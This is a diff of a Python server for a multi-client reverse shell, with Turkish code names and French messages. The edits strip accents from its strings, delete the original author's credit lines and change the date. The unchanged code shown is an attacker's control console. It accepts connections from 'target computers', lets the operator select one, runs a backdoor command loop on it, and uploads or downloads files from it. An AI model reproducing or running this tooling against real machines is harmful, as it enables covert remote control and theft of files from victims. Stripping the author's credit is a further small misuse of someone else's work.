@@ -26,14 +26,14 @@ class Listener:
         self.cwd = None
         self.cwd_durum = True
         self.komutlar = {'help:': "Donne des informations sur comment utiliser l application. ",
-                         'list:': "Répertorie les ordinateurs qui se connectent. ",
-                         'select:': "Permet de sélectionner parmi les ordinateurs connectés qui sont indexés. ",
-                         'quit:': "Arrête la connexion depuis un ordinateur selectionné. ",
-                         'exit:': "Arrête le serveur en cours d exécution et quitte l application. ",
-                         'upload:': "Elle permet de upload des fichiers sur la machine cible sélectionnée. Cette commande s exécute après la sélection de l ordinateur cible. ",
-                         'download:': "Elle permet de télécharger des fichiers sur la machine cible sélectionnée. Cette commande s exécute après la sélection de l ordinateur cible. ",
+                         'list:': "Repertorie les ordinateurs qui se connectent. ",
+                         'select:': "Permet de selectionner parmi les ordinateurs connectes qui sont indexes. ",
+                         'quit:': "Arrete la connexion depuis un ordinateur selectionne. ",
+                         'exit:': "Arrete le serveur en cours d execution et quitte l application. ",
+                         'upload:': "Elle permet de upload des fichiers sur la machine cible selectionnee. Cette     commande s execute apres la selection de l ordinateur cible. ",
+                         'download:': "Elle permet de telecharger des fichiers sur la machine cible selectionnee. Cette commande s execute apres la selection de l ordinateur cible. ",
                          }
-        print(self.uyari_renk("[+] Serveur démarré.", 1))
+        print(self.uyari_renk("[+] Serveur demarre.", 1))
         print(self.uyari_renk("[+] En attente de connexions entrantes ...", 1))
 
     def yardim(self):
@@ -88,7 +88,7 @@ class Listener:
                 self.baglantilar.append(baglanti)
                 self.adresler.append(adres)
                 print(self.uyari_renk(
-                    "\n[+] " + adres[-1] + " (" + adres[0] + ")" + " est connecté", 1))
+                    "\n[+] " + adres[-1] + " (" + adres[0] + ")" + " est connecte", 1))
 
                 if self.quit == True:
                     print(self.uyari_renk("listener >> ", 3), end="")
@@ -101,7 +101,7 @@ class Listener:
                         print(self.uyari_renk(self.cwd, 3), end="")
             except Exception as e:
                 print(self.uyari_renk(
-                    "[-] Une erreur s est produite lors de la liaison à la cible", 2))
+                    "[-] Une erreur s est produite lors de la liaison a la cible", 2))
                 print(self.uyari_renk("[-] Message d'erreur:"+str(e), 2))
                 self.cwd_durum = False
                 self.aktif_baglanti_kes(False)
@@ -128,11 +128,11 @@ class Listener:
                     self.queue.task_done()
                 except:
                     continue
-                print(self.uyari_renk("[*] Déconnecté du serveur", 1))
+                print(self.uyari_renk("[*] Deconnecte du serveur", 1))
                 break
             else:
                 print(self.uyari_renk(
-                    "[-] La commande n a pas pu être traitée!", 2))
+                    "[-] La commande n a pas pu etre traitee!", 2))
                 print(self.uyari_renk(
                     "[*] Entrez la commande 'help' pour savoir comment utiliser l application!", 2))
         if self.cwd_durum == False:
@@ -162,13 +162,13 @@ class Listener:
             index = int(index)
         except:
             print(self.uyari_renk(
-                "[-] Veuillez sélectionner une cible valide", 2))
+                "[-] Veuillez selectionner une cible valide", 2))
             return None, None
         try:
             baglanti = self.baglantilar[index]
             baglanti.send(str.encode(" "))
             print(self.uyari_renk("[+] " + str(self.adresler[index][2]) + " (" + str(
-                self.adresler[index][0]) + ") connecté à votre ordinateur", 1))
+                self.adresler[index][0]) + ") connecte a votre ordinateur", 1))
             return baglanti, index
 
         except:
@@ -176,7 +176,7 @@ class Listener:
                 del self.baglantilar[index]
                 del self.adresler[index]
             print(self.uyari_renk(
-                "[-] Veuillez sélectionner une cible valide", 2))
+                "[-] Veuillez selectionner une cible valide", 2))
             return None, None
 
     def aktif_baglanti_kes(self, durum=True):
@@ -202,14 +202,14 @@ class Listener:
                 return self.al()
             else:
                 print(self.uyari_renk(
-                    "[-] L ordinateur cible sur lequel vous travaillez est déconnecté ...", 2))
-                print(self.uyari_renk("[-] Connexion fermée!", 2))
+                    "[-] L ordinateur cible sur lequel vous travaillez est deconnecte ...", 2))
+                print(self.uyari_renk("[-] Connexion fermee!", 2))
                 self.aktif_baglanti_sifirla()
         except Exception as e:
             print(self.uyari_renk(
-                "[-] L ordinateur cible sur lequel vous travaillez est déconnecté ...", 2))
+                "[-] L ordinateur cible sur lequel vous travaillez est deconnecte ...", 2))
             print(self.uyari_renk("[-] Message d erreur: " + str(e), 2))
-            print(self.uyari_renk("[-] Connexion fermée!", 2))
+            print(self.uyari_renk("[-] Connexion fermee!", 2))
             self.aktif_baglanti_sifirla()
 
     def gonder(self, veri):
@@ -235,16 +235,16 @@ class Listener:
         try:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
-                return self.uyari_renk("[+] Téléchargement réussi!", 1)
+                return self.uyari_renk("[+] Telechargement reussi!", 1)
         except Exception as e:
-            return self.uyari_renk("[-] Le téléchargement du fichier a échoué!"+"\n[-] Message d erreur:"+str(e), 2)
+            return self.uyari_renk("[-] Le telechargement du fichier a echoue!"+"\n[-] Message d erreur:"+str(e), 2)
 
     def dosya_oku(self, dosya):
         try:
             with open(dosya, "rb") as file:
                 return str(base64.b64encode(file.read()), "utf-8")
         except Exception as e:
-            return self.uyari_renk("[-] Le téléchargement du fichier a échoué \n[-] Message d erreur:"+str(e), 2)
+            return self.uyari_renk("[-] Le telechargement du fichier a echoue \n[-] Message d erreur:"+str(e), 2)
 
     def backdoor_komut_calistir(self):
         cwd = self.al()
@@ -264,11 +264,11 @@ class Listener:
                                 komut.append(dosya)
                             else:
                                 sonuc = self.uyari_renk(
-                                    "[-] Pour installer, '" + komut[1] + "' Il n y a aucun fichier nommé!", 2)
+                                    "[-] Pour installer, '" + komut[1] + "' Il n y a aucun fichier nomme!", 2)
                                 durum = False
                         else:
                             sonuc = self.uyari_renk(
-                                "[-] Veuillez spécifier le fichier à télécharger!", 2)
+                                "[-] Veuillez specifier le fichier a telecharger!", 2)
                             durum = False
 
                     if komut[0] == "download":
@@ -291,7 +291,7 @@ class Listener:
                                 sonuc = self.dosya_yaz(komut[1], sonuc)
                         else:
                             sonuc = self.uyari_renk(
-                                "[-] Veuillez spécifier le fichier à télécharger!", 2)
+                                "[-] Veuillez specifier le fichier a telecharger!", 2)
 
                     elif komut[0] == "quit":
                         break
@@ -308,9 +308,9 @@ class Listener:
 
             except Exception as e:
                 print(self.uyari_renk(
-                    "[-] Erreur lors de l exécution de la commande:" + str(e), 2))
+                    "[-] Erreur lors de l execution de la commande:" + str(e), 2))
 
-        print("\n[*] Déconnecté")
+        print("\n[*] Deconnecte")
         self.aktif_baglanti_sifirla()
 
     def about(self):
@@ -328,17 +328,10 @@ class Listener:
             " |_|  \_\___| \_/ \___|_|  |___/\___| |_____/|_| |_|\___|_|_|", 1))
         print(self.uyari_renk(
             "# ==============================================================================", 1))
-        print(self.uyari_renk("# author      	:", 1) + "Mustafa Dalga")
-        print(self.uyari_renk("# website    	:", 1) + "https://apierson.com")
-        print(self.uyari_renk("# linkedin    	:", 1) +
-              "https://www.linkedin.com/in/mustafadalga")
-        print(self.uyari_renk("# github      	:", 1) +
-              "https://github.com/mustafadalga")
-        print(self.uyari_renk("# email      	:", 1) +
-              "mustafadalgaa < at > gmail[.]com")
+
         print(self.uyari_renk("# description 	:", 1) +
-              "Reverse-Shell multi-clients qui autorise plusieurs connexions à partir des ordinateurs cibles.")
-        print(self.uyari_renk("# date        	:", 1) + "29.06.2019")
+              "Reverse-Shell multi-clients qui autorise plusieurs connexions a partir des ordinateurs cibles.")
+        print(self.uyari_renk("# date        	:", 1) + "25.02.2020")
         print(self.uyari_renk("# version     	:", 1) + "1.0")
         print(self.uyari_renk("# python_version:", 1) + "3.7.2")
         print(self.uyari_renk(
@@ -350,5 +343,5 @@ try:
     listener.thread_olustur()
     listener.gorev_olustur()
 except:
-    print(listener.uyari_renk("\n\n[*] Déconnecté du serveur", 1))
+    print(listener.uyari_renk("\n\n[*] Deconnecte du serveur", 1))
     sys.exit()
